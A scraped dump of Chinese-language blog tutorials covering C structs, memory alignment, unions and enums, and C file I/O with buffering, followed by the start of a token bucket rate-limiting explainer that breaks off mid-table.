== st2 st1 != st2 etc. /* 在相同类型下的结构体，操作是有效的 */ st1 = st2 因为C语言没有提供比较运算，所以没法进行结构体比较，需要自行比较结构体成员来比较结构体是否一样\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; struct student { char name[20]; double roll; char gender; int marks[5]; }st1,st2; void main() { struct student st1= { \u0026quot;Alex\u0026quot;, 43, 'M', {76, 78, 56, 98, 92}}; struct student st2 = { \u0026quot;Max\u0026quot;, 33, 'M', {87, 84, 82, 96, 78}}; if( strcmp(st1.name,st2.name) == 0 \u0026amp;\u0026amp; st1.roll == st2.roll) printf(\u0026quot;Both are the records of the same student.\\n\u0026quot;); else printf(\u0026quot;Different records, different students.\\n\u0026quot;); /* Copiying the structure variable */ st2 = st1; if( strcmp(st1.name,st2.name) == 0 \u0026amp;\u0026amp; st1.roll == st2.roll) printf(\u0026quot;\\nBoth are the records of the same student.\\n\u0026quot;); else printf(\u0026quot;\\nDifferent records, different students.\\n\u0026quot;); } 输出结果\nDifferent records, different students. Both are the records of the same student. 结构体数组 结构体数组是指数组元素是结构体，例如下面声明一个类型为student的数组\nstruct student { char name[20]; double roll; char gender; int marks[5]; }; struct student stu[4]; 初始化和访问可以通过循环进行\nfor (int i = 0; i \u0026lt; 4; i++) { printf(\u0026quot;Enter name:\\n\u0026quot;); scanf(\u0026quot;%s\u0026quot;,\u0026amp;stu[i].name); printf(\u0026quot;Enter roll:\\n\u0026quot;); scanf(\u0026quot;%d\u0026quot;,\u0026amp;stu[i].roll); printf(\u0026quot;Enter gender:\\n\u0026quot;); scanf(\u0026quot; %c\u0026quot;,\u0026amp;stu[i].gender); for( int j = 0; j \u0026lt; 5; j++) { printf(\u0026quot;Enter marks of %dth subject:\\n\u0026quot;,j); scanf(\u0026quot;%d\u0026quot;,\u0026amp;stu[i].marks[j]); } printf(\u0026quot;\\n-------------------\\n\\n\u0026quot;); } /* Finding the average marks and printing it */ for(int i = 0; i \u0026lt; 4; i++) { float sum = 0; for( int j = 0; j \u0026lt; 5; j++) { sum += stu[i].marks[j]; } printf(\u0026quot;Name: %s\\nAverage Marks = %.2f\\n\\n\u0026quot;, stu[i].name, sum / (sizeof(stu[i].marks) / sizeof(stu[i].marks[0]))); } 将代码整合为一起\n#include \u0026lt;stdio.h\u0026gt; struct student { char name[20]; double roll; char gender; int marks[5]; }; struct student stu[4]; void main() { for (int i = 0; i \u0026lt; 4; i++) { printf(\u0026quot;Enter name:\\n\u0026quot;); scanf(\u0026quot;%s\u0026quot;,\u0026amp;stu[i].name); printf(\u0026quot;Enter roll:\\n\u0026quot;); scanf(\u0026quot;%d\u0026quot;,\u0026amp;stu[i].roll); printf(\u0026quot;Enter gender:\\n\u0026quot;); scanf(\u0026quot; %c\u0026quot;,\u0026amp;stu[i].gender); for( int j = 0; j \u0026lt; 5; j++) { printf(\u0026quot;Enter marks of %dth subject:\\n\u0026quot;,j); scanf(\u0026quot;%d\u0026quot;,\u0026amp;stu[i].marks[j]); } printf(\u0026quot;\\n-------------------\\n\\n\u0026quot;); } /* Finding the average marks and printing it */ for(int i = 0; i \u0026lt; 4; i++) { float sum = 0; for( int j = 0; j \u0026lt; 5; j++) { sum += stu[i].marks[j]; } printf(\u0026quot;Name: %s\\nAverage Marks = %.2f\\n\\n\u0026quot;, stu[i].name, sum / (sizeof(stu[i].marks) / sizeof(stu[i].marks[0]))); } } 结构体嵌套结构体 嵌套结构体表示，结构体的成员是另外一个结构体\nstruct date { int date; int month; int year; }; struct student { char name[20]; int roll; char gender; int marks[5]; struct date birthday; }; 其定义语法为：struct \u0026lt;other struct\u0026gt; \u0026lt;member_name\u0026gt;; 这里 birthday 是名为data类型结构体\nNotes：结构体内部不能嵌套自己\n访问嵌套结构体和正常结构体访问一样使用符号，成员名称==.==成员属性==.==成员属性\nstu1.birthday.date stu1.birthday.month stu1.birthday.year stu1.name 结构体内存分配 结构体声明后是不占用内存，只有被初始化后才占用内存，结构体内每个成员会被分配到连续的内存内，sizeof()的大小是每个元素所占用的大小。\n示例代码为一个student的结构体，有四个成员，name为20 bytes的字符串，roll是4字节的int类型，gender是1字节的char，marks为5个元素的数组，那么这个结构体的总大小应该为 $20+4+1+5\\times4$\nstruct student { char name[20]; int roll; char gender; int marks[5]; } stu1; 将上述代码整合为\nvoid main() { printf(\u0026quot;Sum of the size of members = %I64d bytes\\n\u0026quot;, sizeof(stu1.name) + sizeof(stu1.roll) + sizeof(stu1.gender) + sizeof(stu1.marks)); printf(\u0026quot;Using sizeof() operator = %I64d bytes\\n\u0026quot;,sizeof(stu1)); } // 输出结果为 Sum of the size of members = 45 bytes Using sizeof() operator = 48 bytes 可以看到两个结果并不相等，可以看出实际被多分配了3个字节，需要知道为什么被多分配需要先打印他们的地址\n#include \u0026lt;stdio.h\u0026gt; struct student { char name[20]; int roll; char gender; int marks[5]; } stu1; void main() { printf(\u0026quot;Address of member name = %d\\n\u0026quot;, \u0026amp;stu1.name); printf(\u0026quot;Address of member roll = %d\\n\u0026quot;, \u0026amp;stu1.roll); printf(\u0026quot;Address of member gender = %d\\n\u0026quot;, \u0026amp;stu1.gender); printf(\u0026quot;Address of member marks = %d\\n\u0026quot;, \u0026amp;stu1.marks); } 输出结果为\nAddress of member name = 4225408 Address of member roll = 4225428 Address of member gender = 4225432 Address of member marks = 4225436 可以看到char类型占用一个字节，而接下来的成员 marks 却是从4225436开始的，而不是4225433。这就需要引入下面的概念数据对齐 (Data alignment)\n数据对齐 数据对齐是指处理器在数据对齐时访问效率最高，这将代表了数据存储在内存中的大小的倍数。而现代计算机字长通常为4 字节（32 位操作胸痛）或 8 字节（64 位操作系统）的字长。\n对于一个int类型的变量，占用的资产时4字节，此时符合处理器读取机制，因为符合计算机字长长度。而作为char类型，占用一个字节。如果不做数据对齐操作，就会出现如下图出现的问题，数据在存储时读取的字长永远是多一个步骤的。\n下图是一个错位的数据，粉红代表char类型，蓝色代表short类型，绿色代表int类型，如果不进行对齐，再继续存储int时，在读取数据时一个字长位移都将不足以读取一个int类型，这就需要进行两次数据访问才能读取一个int类型，也就是花费了两倍的时间\n图：Misaligned memory Source：https://hps.vi4io.org/_media/teaching/wintersemester_2013_2014/epc-14-haase-svenhendrik-alignmentinc-paper.pdf\n出于上述原因才有了数据对齐的概念，下图所示的对齐模式被称为自然对齐 (naturally aligned)\n图：Properly aligned memory using padding Source：https://hps.vi4io.org/_media/teaching/wintersemester_2013_2014/epc-14-haase-svenhendrik-alignmentinc-paper.pdf\n内容填充 在对齐时所插入的额外字节数的部分被称为填充 (padding)，在上图中，黑色部分为填充的部分，而在上述代码示例中所填充的部分为3字节，而4225433位的内存地址存储int类型（marks[0]的地址）不是4的倍数。\n下表说明了需要对其的数据类型规则\n数据类型 占字节数大小 地址倍数 char 1 1的倍数 short 2 2的倍数 int, float 4 4的倍数 double, long, *(pointer) 8 8的倍数 long double 16 16的倍数 另外一个示例，应该是多少？\n#include \u0026lt;stdio.h\u0026gt; struct student { int i1; double d1; char c1; } stu1; void main() { // long long int a, b, c; // a = 1, b = 30000000000009, c = 5; // %I64d是微软风格的%lld，为了避免大于4字节的类型被省略，而输出异常，兼容%d // printf(\u0026quot;%I64d %I64d %I64d\\n\u0026quot;, a, b, c); // rintf(\u0026quot;%d %d %d\\n\u0026quot;, a, b, c); printf(\u0026quot;size = %I64d bytes\\n\u0026quot;,sizeof(stu1)); } 由于 i1 为int类型4字节，d1 为 double类型8字节，c1 为char类型1字节 ，那么 $4+8+1=13$ 被填充后应该是16字节，那么看下输出结果\nsize = 24 bytes 实际上在C语言中结构体的数据类型对齐不是这么计算的，实际上结构体数据对齐条件是根据结构体内最大的元素进行调整 [2]，例如这里最大元素为8，那么对齐标准就是补足8字节 i1 需要补4，c1 需要补7\n通过调整结构体顺序可以减少填充的大小，例如下列代码，其实际大小为1 byte + 8 bytes + 1 bytes = 10 bytes，而实际大小为24bytes，因为double将影响填充的大小\nstruct Foo { char x; // 1 byte double y // 8 bytes char z; // 1 bytes }; 而通过按照类型的由小到大的顺序进行定义成员，可以减少填充的次数与大小，这样1+1+(6)+8=16\nstruct Foo { char x; // 1 byte char z; // 1 bytes double y // 8 bytes }; 为此得出的结论为，对结构体成员重新排序可以提高内存效率\n数据打包 数据打包 (Packing) 是指强制编译器不进行数据填充，与数据填充是相反的作用\n在windows上使用宏定义 #pragma pack(1) 来指定对齐方式，也可以使用 __attribute__((packed)) 指定一个结构体补进行填充。\n#include \u0026lt;stdio.h\u0026gt; // #pragma pack(1) struct student { int i1; double d1; char c1; } stu1; struct Foo { char x; // 1 byte char z; // 1 bytes double y // 8 bytes } __attribute__((packed)) f1; void main() { printf(\u0026quot;size = %I64d bytes\\n\u0026quot;,sizeof(stu1)); printf(\u0026quot;size = %I64d bytes\\n\u0026quot;,sizeof(f1)); } 输出结果为\nsize = 24 bytes size = 10 bytes 还可以指定特定的大小进行填充，例如\n#include \u0026lt;stdio.h\u0026gt; // #pragma pack(1) struct student { int i1; double d1; char c1; } stu1; struct Foo { char x; // 1 byte char z; // 1 bytes double y // 8 bytes } __attribute__((packed, aligned(4))) f1; void main() { printf(\u0026quot;size = %I64d bytes\\n\u0026quot;,sizeof(stu1)); printf(\u0026quot;size = %I64d bytes\\n\u0026quot;,sizeof(f1)); } 输出结果为\nsize = 24 bytes size = 12 bytes 指针结构体 这里包含指针作为结构体成员和指针指向结构体\n#include \u0026lt;stdio.h\u0026gt; struct student { char *name; int *roll; char gender; int marks[5]; }; void main() { int alexRoll = 44; struct student stu1 = { \u0026quot;Alex\u0026quot;, \u0026amp;alexRoll, 'M', { 76, 78, 56, 98, 92 }}; struct student *stu2 = \u0026amp;stu1; printf(\u0026quot;stu1 Name is %s\\n\u0026quot;, stu1.name); // 无效的访问 // printf(\u0026quot;stu1 roll is %s\\n\u0026quot;, stu1.(*roll)); // 错误的访问，输出的地址 printf(\u0026quot;stu1 roll is %d\\n\u0026quot;, stu1.roll); // 正确的访问方式 printf(\u0026quot;stu1 roll is %d\\n\u0026quot;, *(stu1.roll)); // 访问指针结构体成员的方法 printf(\u0026quot;stu2 Name is %s\\n\u0026quot;, stu2-\u0026gt;name); printf(\u0026quot;stu2 Name is %s\\n\u0026quot;, (*stu2).name); } 总结：\n. 运算符优先于 * 运算符，需要加括号改变优先级\n如果成员属性是指针类型，访问其内容应先解引用成员 *(stu1.roll)\n如果指针是结构体需要解引用结构体 (*stu2).name\n指针类型访问成员的特殊方法为 -\u0026gt;\n结构体数组 结构体也可以作为数组的形式，每个数组元素为一个结构体。作为数组结构体时，指针类型需要解引用或者使用 -\u0026gt; 来访问。\n#include \u0026lt;stdio.h\u0026gt; struct student { char *name; int *roll; char gender; int marks[5]; }; void main() { int alexRoll = 44; struct student stu1 = { \u0026quot;Alex\u0026quot;, \u0026amp;alexRoll, 'M', { 76, 78, 56, 98, 92 }}; struct student stu[10]; struct student *stuPtr = stu; struct student (*stuPtr)[10] = \u0026amp;stu; printf(\u0026quot;name %s\\n\u0026quot;, stuPtr[10]-\u0026gt;name); printf(\u0026quot;name %s\\n\u0026quot;, (*stuPtr)[10].name); } 结构体函数 在C语言中，函数不能作为结构体成员，但是函数指针可以，使用 . 可以调用指针函数成员\n#include \u0026lt;stdio.h\u0026gt; struct example { int i; void (*ptrMessage)(int i); }; void message(int); void message(int i) { printf(\u0026quot;Hello, I'm a member of a structure. This structure also has an integer with value %d\u0026quot;, i); } void main() { struct example eg1 = {6, message}; eg1.ptrMessage(eg1.i); } 结构体作为函数参数 当函数参数过多时，传递大量参数效率很低，可以将结构体作为参数传递给函数\n#include \u0026lt;stdio.h\u0026gt; struct student { char name[20]; int roll; char gender; int marks[5]; }; void display(struct student a) { printf(\u0026quot;Name: %s\\n\u0026quot;, a.name); printf(\u0026quot;Roll: %d\\n\u0026quot;, a.roll); printf(\u0026quot;Gender: %c\\n\u0026quot;, a.gender); for(int i = 0; i \u0026lt; 5; i++) printf(\u0026quot;Marks in %dth subject: %d\\n\u0026quot;,i,a.marks[i]); } void main() { struct student stu1 = {\u0026quot;Alex\u0026quot;, 43, 'M', {76, 98, 68, 87, 93}}; display(stu1); } 如果结构体比较复杂，传递副本参数效率不高，也可以传递指针结构体作为函数参数\n#include \u0026lt;stdio.h\u0026gt; struct student { char name[20]; int roll; char gender; int marks[5]; }; void display(struct student *a) { printf(\u0026quot;Name: %s\\n\u0026quot;, a-\u0026gt;name); printf(\u0026quot;Roll: %d\\n\u0026quot;, a-\u0026gt;roll); printf(\u0026quot;Gender: %c\\n\u0026quot;, a-\u0026gt;gender); for(int i = 0; i \u0026lt; 5; i++) printf(\u0026quot;Marks in %dth subject: %d\\n\u0026quot;,i,a-\u0026gt;marks[i]); } void main() { struct student stu1 = {\u0026quot;Alex\u0026quot;, 43, 'M', {76, 98, 68, 87, 93}}; struct student *stuPtr = \u0026amp;stu1; display(stuPtr); } 结构体作为函数返回值 结构体可以作为函数的返回值\n#include \u0026lt;stdio.h\u0026gt; struct student { char name[20]; int roll; char gender; int marks[5]; }; struct student increaseBy5(struct student p) { for( int i =0; i \u0026lt; 5; i++) if(p.marks[i] + 5 \u0026lt;= 100) { p.marks[i]+=5; } return p; } void main() { struct student stu1 = {\u0026quot;Alex\u0026quot;, 43, 'M', {76, 98, 68, 87, 93}}; stu1 = increaseBy5(stu1); printf(\u0026quot;Name: %s\\n\u0026quot;, stu1.name); printf(\u0026quot;Roll: %d\\n\u0026quot;, stu1.roll); printf(\u0026quot;Gender: %c\\n\u0026quot;, stu1.gender); for(int i = 0; i \u0026lt; 5; i++) printf(\u0026quot;Marks in %dth subject: %d\\n\u0026quot;,i,stu1.marks[i]); } 当然如果结构体交复杂，也可以用结构体指针作为返回值\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; struct student { char name[20]; int roll; char gender; int marks[5]; }; struct student* increaseBy5(struct student *p) { for( int i =0; i \u0026lt; 5; i++) if(p-\u0026gt;marks[i] + 5 \u0026lt;= 100) { p-\u0026gt;marks[i]+=5; } return p; } void main() {\tstruct student stu1 = {\u0026quot;Alex\u0026quot;, 43, 'M', {76, 98, 68, 87, 93}}; struct student *stuptr = (struct student *) malloc(sizeof(struct student)); stuptr = \u0026amp;stu1; stuptr = increaseBy5(stuptr); printf(\u0026quot;Name: %s\\n\u0026quot;, stuptr-\u0026gt;name); printf(\u0026quot;Roll: %d\\n\u0026quot;, stuptr-\u0026gt;roll); printf(\u0026quot;Gender: %c\\n\u0026quot;, stuptr-\u0026gt;gender); for(int i = 0; i \u0026lt; 5; i++) printf(\u0026quot;Marks in %dth subject: %d\\n\u0026quot;,i,stuptr-\u0026gt;marks[i]); } typedef typedef 是C语言中的关键字，功能是为现有数据类型分配别名，例如为long类型声明一个别名\ntypedef long int64 也可以在结构体中使用\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; struct employee { char *name; int salary; } emp; typedef struct employee1 { char *name; int salary; }emp1; void main() {\t// 不使用typedef定义的结构体,在使用时需要加关键字struct struct employee e1; e1.salary=10; e1.name=\u0026quot;zhangsan\u0026quot;; // 使用typedef定义结构体,在使用时，可以直接使用结构体名称 emp1 e2; e2.salary=100; e2.name=\u0026quot;lisi\u0026quot;; printf(\u0026quot;name1: %s\\n\u0026quot; ,e1.name); printf(\u0026quot;salary1: %d\\n\u0026quot; ,e1.salary); printf(\u0026quot;name2: %d\\n\u0026quot; ,*(e2.name)); printf(\u0026quot;salary2: %d\\n\u0026quot; ,e2.salary); } typedef主要功能：\n别名，简化结构体类型struct关键字\n区分数据类型\nchar * p1,p2; // 声明两个变量 p1为char指针类型，p2为char类型 typedef char* charPtr; charPtr p1,p2; // 声明两个变量为char*类型 提高代码的可移植性\ntypedef long long int64; typedef long long int32; // 在大量别名情况下无需每个替换 int64 a=10; int64 b=20; union union是类似于结构体的一种用户自定义类型，与结构体最大的区别是，结构体是存储一系列元素的联合体，而union是多个成员，仅有一个元素能被存储。\n定义 定义union语法：\nunion \u0026lt;attr-spec-seq(optional)\u0026gt; \u0026lt;name(optional)\u0026gt; { struct-declaration-list } \u0026lt;union var,\u0026hellip;\u0026gt; union \u0026lt;attr-spec-seq(optional)\u0026gt; name union car { char name[50]; int price; }; 定义union不会被分配内存，如果要分配内存则需要创建变量使用它\n访问 #include \u0026lt;stdio.h\u0026gt; union Job { float salary; int workerNo; } j; int main() { j.salary = 12.3; // 当对j.workerNo成员分配了值 // j.salary持有的12.3将不再拥有 j.workerNo = 100; printf(\u0026quot;Salary = %.1f\\n\u0026quot;, j.salary); printf(\u0026quot;Number of workers = %d\u0026quot;, j.workerNo); return 0; } 总结\nunion是用户自定义的数据类型 union中成员都是相同的内存地址 union保存的内容仅为最近一次赋值的元素的值（哪个元素被赋值，哪个元素被激活） union大小为其占用空间最大的那个成员 enum 枚举(enumeration)是C语言中特殊的数据类型，通常是包含具有共同性数据的集合，例如性别，男，女\nenum gender { MALE, FEMALE }; 声明 常用的有两种方式来使用枚举类型\nenum textEditor { BOLD, ITALIC, UNDERLINE } feature; 与\nenum textEditor { BOLD, ITALIC, UNDERLINE }; int main() { enum textEditor feature; return 0; } 赋值 enum textEditor { BOLD, ITALIC, UNDERLINE } feature; int main() { // Initializing enum variable enum textEditor feature = BOLD; printf(\u0026quot;Selected feature is %d\\n\u0026quot;, feature); // Initializing enum with integer equivalent feature = 5; printf(\u0026quot;Selected feature is %d\\n\u0026quot;, feature); return 0; } 总结：\n枚举是整数常量类型 枚举包含的元素即为对应变量可以拥有的值 因为是整数常量，可以转换为char，bool等 枚举的元素结尾是逗号，最后一个元素没有符号；结构体的元素结尾为分号 Reference [1] structured data types in c explained\n[2] Alignment in C\n","permalink":"https://www.oomkill.com/2022/09/ch07-composite-type/","summary":"","title":"ch07 复合类型"},{"content":"文件类型 文件是指以字节的形式存储的数据源，使用C语言将文件数据以输出输出的形式处理叫做文件处理。\n文件在C语言中以两种形式存在：\n文本文件：文本文件是简单的文件类型，这些文件内容以 ASCII 字符格式存储信息。 二进制文件：二进制文件以 0 和 1 的二进制格式存储数据，不是人类可读的文件 文件指针 文件指针 (FILE) 是一种数据类型，是被定义在 stdio.h 中的一种结构体，包含了文件的一些信息\ntypedef struct { // fill/empty level of buffer int level; // File status flags unsigned flags; // File descripter char fd; // ungetc char if no buffer unsigned char hold; // buffer size int bsize; // data transfer buffer unsigned char *buffer; // Current active pointer unsigned char *curp; //Temporary file indicator unsigned istemp; //Used for validity checking short token; } FILE; // This is FILE object 文件指针通常被用于处理正在访问的文件，fopen() 是用于打开文件并返回文件的 FILE 指针，而后通过文件只恨进行I/O操作。fopen() 会发生下列事件：\n文件的内容被加载到缓冲区（操作系统层面） 在内存中创建 FILE 的数据结构体，并返回这个结构体指针 文件处理函数 函数 功能 fopen() 打开现有文件或新文件 fprintf() 将数据写入打开的文件 fscanf() 读取文件中数据 fputc() 向文件写入一个字符 fgetc() 从文件中读取一个字符 fclose() 关闭打开的文件 fseek() 设置文件指针的位置 fputw() 将一个整数写入到文件 fgetw() 从文件中读取一个整数 ftell() 文件指针的当前位置 rewind() 设置文件指针位置为初始位置 fread() 读取文件内容（二进制与文本） fwrite() 向文件写入内容（二进制与文本） feof() 是否到达文件结尾\n非0 True 到达文件结尾\n0 False 没有到达文件结尾 fscanf VS fgets fscanf读取的是字符，fgets读取的是字符串 fgets读取换行符结束，fscanf读取到空白就结束，不用换行符 fgets以行为单位，fscanf以字符为单位（参数2匹配的模式） fscanf每次会判断是否匹配，如不匹配则提前退出读取 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void main() {\tFILE *fp; fp = fopen(\u0026quot;./k8s restart.txt\u0026quot;, \u0026quot;r\u0026quot;); if (fp == NULL) { printf(\u0026quot;Error! opening file\u0026quot;); exit(1); } char buf[1024]; while( feof(fp) == 0 ){ printf(\u0026quot;i=%d\\n\u0026quot;, i); // fscanf(fp, \u0026quot;%s\u0026quot;, \u0026amp;buf); fgets(buf, 1024, fp); printf(\u0026quot;%s\\n\u0026quot;, buf); } fclose(fp); } 文件的打开模式 模式 含义 当文件不存在时处理方法 r 只读方式打开文件 当文件路径不存在时fopen()返回NULL rb 以只读方式打开二进制文件 当文件路径不存在时fopen()返回NULL w 写入方式 如果文件存在则覆盖，如果不存在则创建新文件 wb 写入方式（二进制模式） 如果文件存在则覆盖，如果不存在则创建新文件 a 打开文件并向结尾追加内容 如果文件路径不存在则创建新文件 ab 打开文件并向结尾追加内容（二进制模式） 如果文件路径不存在则创建新文件 r+ 读写方式打开文件 当文件路径不存在时fopen()返回NULL rb+ 读写方式打开文件（二进制模式） 当文件路径不存在时fopen()返回NULL w+ 读写方式打开文件 如果文件存在则覆盖，如果不存在则创建新文件 wb+ 读写方式打开文件（二进制模式） 如果文件存在则覆盖，如果不存在则创建新文件 a+ 追加和读取 如果文件路径不存在则创建新文件 ab+ 追加和读取（二进制模式） 如果文件路径不存在则创建新文件 文件操作的步骤 打开文件 fopen() （ FILE *Pointer）\n读写文件 fputc , fgetc, fputs, fgets, fread, fwrite \u0026hellip;.\n关闭文件 fclose()\n打开文件 FILE * ptr ptr = fopen(\u0026quot;file dir\u0026quot;,\u0026quot;mode\u0026quot;); 例如\nfopen(\u0026quot;/etc/hosts\u0026quot;,\u0026quot;rb\u0026quot;); 关闭文件 fclose(fptr); 读/写文件 向文本文件中写入数据\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int num; FILE *fptr; fptr = fopen(\u0026quot;~/1.txt\u0026quot;,\u0026quot;w\u0026quot;); if(fptr == NULL) { printf(\u0026quot;Error!\u0026quot;); exit(1); } printf(\u0026quot;Enter num: \u0026quot;); scanf(\u0026quot;%d\u0026quot;,\u0026amp;num); fputc(str[i], fptr); // fputc向文件写入数据 fputs(\u0026quot;fputs向文件写入数据\\n\u0026quot;, fptr); fprintf(fptr, \u0026quot;fprintf向文件写入数据\\n\u0026quot;); fclose(fptr); return 0; } 从文本文件中读取内容\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int num; FILE *fptr; if ((fptr = fopen(\u0026quot;~/1.txt\u0026quot;,\u0026quot;r\u0026quot;)) == NULL){ printf(\u0026quot;Error! opening file\u0026quot;); exit(1); } fscanf(fptr,\u0026quot;%d\u0026quot;, \u0026amp;num); printf(\u0026quot;Value of n=%d\u0026quot;, num); fclose(fptr); return 0; } 写入二进制文件 二进制文件的读取使用，fwrite()/fread()函数，通常情况下二进制文件读取没有意义，只是做类似文件拷贝的操作。\nfwrite(addressData, sizeData, numbersData, pointerToFile);\naddressData：写入磁盘的数据的地址 sizeData：要写入磁盘的数据大小 numbersData：写出的数据个数 pointerToFile：FILE指针 return： 成功：参数3的大小 失败：0 Notes：通常参数2为1，参数3为写入的总大小。 参2 * 参3 = 写入的总大小\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; struct threeNum { int n1, n2, n3; }; int main() { int n; struct threeNum num; FILE *fptr; if ((fptr = fopen(\u0026quot;C:\\\\program.bin\u0026quot;,\u0026quot;wb\u0026quot;)) == NULL){ printf(\u0026quot;Error! opening file\u0026quot;); // Program exits if the file pointer returns NULL. exit(1); } for(n = 1; n \u0026lt; 5; ++n) { num.n1 = n; num.n2 = 5*n; num.n3 = 5*n + 1; fwrite(\u0026amp;num, sizeof(struct threeNum), 1, fptr); } fclose(fptr); return 0; } 从二进制文件读取数据 fread(addressData, sizeData, numbersData, pointerToFile);：\naddressData：读取到的数据存储的位置 sizeData：一次读取的字节数 numbersData：读取次数 pointerToFile：文件指针 return： 成功：参数3的大小 失败：0 到达文件结尾：feof(fp)为真 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; struct threeNum { int n1, n2, n3; }; int main() { int n; struct threeNum num; FILE *fptr; if ((fptr = fopen(\u0026quot;C:\\\\program.bin\u0026quot;,\u0026quot;rb\u0026quot;)) == NULL){ printf(\u0026quot;Error! opening file\u0026quot;); // Program exits if the file pointer returns NULL. exit(1); } for(n = 1; n \u0026lt; 5; ++n) { fread(\u0026amp;num, sizeof(struct threeNum), 1, fptr); printf(\u0026quot;n1: %d\\tn2: %d\\tn3: %d\\n\u0026quot;, num.n1, num.n2, num.n3); } fclose(fptr); return 0; } 缓冲区 缓冲区是操作系统的内存空间中的一部分。操作系统在内存空间中预留了一定的存储空间，在输入或输出达到一定量后进行I/O操作，这部分空间就叫做缓冲区。\n程序在启动时，预定义了三种缓冲区，不需要显式开启：\n标准输入 (stdin)： 标准输出 (stdout)： 标准错误 (stderr)：标准错误是一个无缓冲 stdio.h 库中提供了三种缓冲模式 [1]：\n无缓冲 (unbuffered)：写入到无缓冲的数据会立即被写入到文件 行缓冲 (line buffered)：当遇到换行符，此类缓冲区内容会被写入到文件 全缓冲 (fully buffered)：缓冲区满或以任意大小的块被写入到文件 可以通过库函数setvbuf(), setbuffer(), setbuf() 三者之一设置 stdio 的缓冲模式，例如\n#define BUF_SIZE 4096 static char buf[BUF_SIZE]; FILE *fp; fp = fopen(\u0026quot;test.txt\u0026quot;, 'w'); if(setvbuf(fp, buf, _IOFBF, BUF_SIZE) !=0 ) exit(EXIT_FAILURE); 可以使用库函数 fflush() 手动刷新缓冲区 [2]，例如\nfp = fopen(\u0026quot;test.txt\u0026quot;, 'w'); fputs(\u0026quot;fputs向文件写入数据\\n\u0026quot;, fptr); fflush(fp); fputs(\u0026quot;fputs向文件写入数据\\n\u0026quot;, fptr); fflush(fp); 如果，全缓冲模式下，缓冲区没满也没刷新，那么只有在文件关闭时， 缓冲区会被自动刷新（写入到文件）\nTips：内存的隐式回收：关闭文件、刷新缓冲区、释放malloc\nReference [1] IO cache\n[2] Controlling Buffering\n","permalink":"https://www.oomkill.com/2022/09/ch08-file-handling/","summary":"","title":"ch08 文件处理"},{"content":"Principle of token bucket 随着互联网的发展，在处理流量的方法也不仅仅为 first-come，first-served，而在共享网络中实现流量管理的基本机制就是排队。而公平算法则是实现在优先级队列中基于哪些策略来排队的 “公平队列” 。Token Bucket 则是为公平排队提供了替代方案。Fair Queue 与 Token Bucket的区别主要在，对于Fair Queue来讲，如果请求者目前空闲，Queue会将该请求者的带宽分配给其他请求者；而 Token Bucket 则是分配给请求者的带宽是带宽的上限。\n通过例子了解算法原理\n假设出站带宽是 4个数据包/ms，此时有一个需求为，为一个特定的发送端 A 来分配 1个数据包/ms的带宽。此时可以使用公平排队的方法分给发送 A 25%的带宽。\n此时存在的问题是我们希望可以灵活地允许 A 的数据包以无规则的时间间隔发送。例如假设 A 在每个数据包发送后等待1毫秒后再开始下一个数据包的发送。\nsence1：此时假设 A 以 1ms 的间隔去发送数据包，而由于某种原因导致应该在 t=6 到达的数据包却在 t=6.5 到达。随后的数据包在 t=7 准时到达，在这种情况下是否应该保留到t=7.5？ sence2：或者是否允许在 t=6.5 发送一个迟到的数据包，在 t=7 发送下一个数据包，此时理论上平均速率仍然还是 1 个数据包/ms？ 显然sence2是合理的，这个场景的解决方法就是令牌桶算法，规定 A 的配额，允许指定平均速率和突发容量。当数据包不符合令牌桶规范，那么就认为其不合理，此时会做出一下相应：\ndelay，直到桶准备好 drop mark，标记为不合规的数据包 delay 被称为 整形 shaping , shaping 是指在某个时间间隔内发送超过 Bc（Committed Burst）的大小，Bc 在这里指桶的尺寸。由于数据流量是突发性的，当在一段时间内不活动后，再次激活后的在一个间隔内发送的数量大于 Bc ，那么额外的流量被称为Be （burst excess）。\n将流量丢弃或标记超额流量，保持在一个流量速率限制称为 “管制” policing。\nDefinition 令牌桶的定义是指，有一个桶，以稳定的速度填充令牌；桶中的任何一个溢出都会被丢弃。当要发送一个数据包，需要能够从桶中取出一个令牌；如果桶是空的那么此时数据包是不合规的数据包，必须进行 delay , drop , mark 操作。如果桶是满的，则会发送与桶容量相对应的突发（短时间内的高带宽传输），这是桶是空的。\n令牌桶的规范：$TB(r,B_{max})$\n$r$ ：r个token每秒的令牌填充率，表示桶填充令牌的速率 $B$ ：桶容量，$B_{mac} \u0026gt; 0$ 那么公式则表示，桶以指定的速率填充令牌，最大为 $B_{max}$ 。这就说明了为了使大小为 S 的数据包合规，桶内必须至少有 S 个令牌，即 $B \\ge S$，否则数据包不合规，在发送时，桶为 $B=B-S$\nExamples 场景1：假设令牌桶规范为 $TB(\\frac{1}{3}\\ packet/ms, 4\\ packet)$，桶最初是满的，数据包在以下时间到达 [0, 0, 0, 2, 3, 6, 9, 12]\n在处理完所有 T=0 的数据包后，桶中还剩 1 个令牌。到第四个数据包 T=2 到达时，桶内已经有1个令牌 + $\\frac{2}{3}$ 个令牌；当发送完第四个数据包时，桶内令牌数为 $\\frac{2}{3}$ 。到 T=3 数据包时，桶内令牌为1，满足发送第 5 个数据包。万松完成后桶是空的，在后面 6 9 12时，都满足3/ms 一个数据包，都可以发送成功\n场景2：另外一个实例，在同样的令牌桶规范下 $TB(\\frac{1}{3}, 4)$，数据包到达时间为 [0, 0, 0, 0, 12, 12, 12, 12, 24, 24, 24, 24] ，可以看到在这个场景下，数据到达为3个突发，每个突发4个数据包，此时每次发送完成后桶被清空，当再次填满时需要12ms，此时另外一组突发达。故这组数据是合规的。、\n场景3：在同样的令牌桶规范下 $TB(\\frac{1}{3}, 4)$，数据包到达时间为 [0, 1, 2, 3, 4, 5] , 这组数据是不合规的\n用表格形式表示如下：\n数据包到达时间 0 1 2 3 4 5 发送前桶内令牌 4 3 $\\frac{1}{3}$ 2 $\\frac{2}{3}$ 2 1 $\\frac{1}{3}$ $\\frac{2}{3}$ 发送后桶内令牌 3 2 $\\frac{1}{3}$ 1 $\\frac{2}{3}$ 1 